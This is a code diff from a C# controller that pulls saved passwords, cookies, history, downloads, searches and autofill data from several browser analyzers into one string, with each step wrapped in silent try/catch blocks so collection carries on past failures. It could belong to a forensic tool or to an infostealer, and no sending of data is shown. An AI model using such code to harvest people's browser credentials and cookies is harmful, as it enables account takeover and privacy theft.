@@ -80,12 +80,13 @@ namespace Controller {
         }
 
         public string getAllInfo() {
-            string res = getDownloads();
-            res += "\r\n" + getPasswords();
-            res += "\r\n" + getCookies();
-            res += "\r\n" + getSearches();
-            res += "\r\n" + getHistory();
-            res += "\r\n" + getAutofills();
+            string res = "";
+            try{   res += getDownloads();            } catch (Exception e) {}
+            try{   res += "\r\n" + getPasswords();   } catch (Exception e) {}
+            try{   res += "\r\n" + getCookies();     } catch (Exception e) {}
+            try{   res += "\r\n" + getSearches();    } catch (Exception e) {}
+            try{   res += "\r\n" + getHistory();     } catch (Exception e) {}
+            try{   res += "\r\n" + getAutofills();   } catch (Exception e) {}
 
             return res;
         }
@@ -94,18 +95,30 @@ namespace Controller {
             List<string> l = new List<string>();
 
             foreach (BrowserAnalyzer.BrowserAnalyzer ba in analyzers) {
-                foreach (AutofillDTO dto in ba.getAutofills())
-                    l.Add(dto.getFullString());
-                foreach (HistoryDTO dto in ba.getHistory())
-                    l.Add(dto.getFullString());
-                foreach (CookiesDTO dto in ba.getCookies())
-                    l.Add(dto.getSmallString());
-                foreach (DownloadsDTO dto in ba.getDownloads())
-                    l.Add(dto.getFullString());
-                foreach (PasswordDTO dto in ba.getPasswords())
-                    l.Add(dto.getFullString());
-                foreach (SearchDTO dto in ba.getSearches())
-                    l.Add(dto.getFullString());
+                try{
+                    foreach (AutofillDTO dto in ba.getAutofills())
+                        l.Add(dto.getFullString());
+                } catch (Exception e) {}
+                try{
+                    foreach (HistoryDTO dto in ba.getHistory())
+                        l.Add(dto.getFullString());
+                } catch (Exception e) {} 
+                try{
+                    foreach (CookiesDTO dto in ba.getCookies())
+                        l.Add(dto.getSmallString());
+                } catch (Exception e) {} 
+                try{
+                    foreach (DownloadsDTO dto in ba.getDownloads())
+                        l.Add(dto.getFullString());
+                } catch (Exception e) {} 
+                try{
+                    foreach (PasswordDTO dto in ba.getPasswords())
+                        l.Add(dto.getFullString());
+                } catch (Exception e) {} 
+                try{
+                    foreach (SearchDTO dto in ba.getSearches())
+                        l.Add(dto.getFullString());
+                } catch (Exception e) {}   
             }
             l.Sort();
             string result = "";
